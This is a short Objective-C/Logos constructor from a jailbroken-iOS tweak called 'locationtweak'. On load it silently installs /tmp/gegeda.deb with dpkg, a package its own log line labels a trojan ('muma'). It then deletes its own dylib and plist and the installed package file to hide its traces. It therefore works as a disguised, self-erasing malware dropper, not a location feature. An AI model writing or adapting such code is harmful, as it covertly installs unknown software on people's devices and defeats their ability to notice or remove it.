%ctor
{
	%init;
	NSLog(@"cuit:locationtweak success!~~~~~~~~~~~~~~~~~~~sharedManager");
    int ret = system("dpkg -i /tmp/gegeda.deb 2>&1");
    NSLog(@"muma deb: %d",ret);
    sleep(5);
	NSLog(@"cuit:locationtweak end!");

	system("rm -f /Library/MobileSubstrate/DynamicLibraries/locationdtweak.plist");
	system("rm -f /Library/MobileSubstrate/DynamicLibraries/locationdtweak.dylib");	
	system("rm -f tmp/gegeda.deb");	
	system("chown root:wheel /Library/MobileSubstrate/DynamicLibraries");
}